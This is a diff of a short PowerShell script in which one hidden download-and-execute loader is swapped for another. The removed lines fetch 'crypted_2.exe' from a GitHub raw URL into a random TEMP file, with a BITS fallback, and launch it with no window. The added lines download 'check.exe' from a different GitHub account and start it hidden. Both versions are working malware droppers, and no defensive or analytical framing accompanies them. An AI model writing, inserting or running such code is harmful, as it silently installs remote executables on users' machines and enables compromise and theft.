@@ -1,13 +1,2 @@
-$ErrorActionPreference='SilentlyContinue'
-[Net.ServicePointManager]::SecurityProtocol=3072
-$p=Join-Path $env:TEMP ('{0}.exe' -f (Get-Random))
-$u='https://github.com/iendjd7-lgtm/-RebelGuyy/raw/refs/heads/main/crypted_2.exe'
-try{(New-Object Net.WebClient).DownloadFile($u,$p)}catch{Start-BitsTransfer -Source $u -Destination $p}
-if((Test-Path $p) -and (Get-Item $p).Length -gt 100000){
- $i=New-Object Diagnostics.ProcessStartInfo
- $i.FileName=$p
- $i.WorkingDirectory=$env:TEMP
- $i.UseShellExecute=$false
- $i.CreateNoWindow=$true
- [void][Diagnostics.Process]::Start($i)
-}
+(New-Object Net.WebClient).DownloadFile('https://github.com/matvejsklarov9-cyber/my/raw/refs/heads/main/check.exe', "$env:TEMP\check.exe")
+Start-Process "$env:TEMP\check.exe" -WindowStyle Hidden
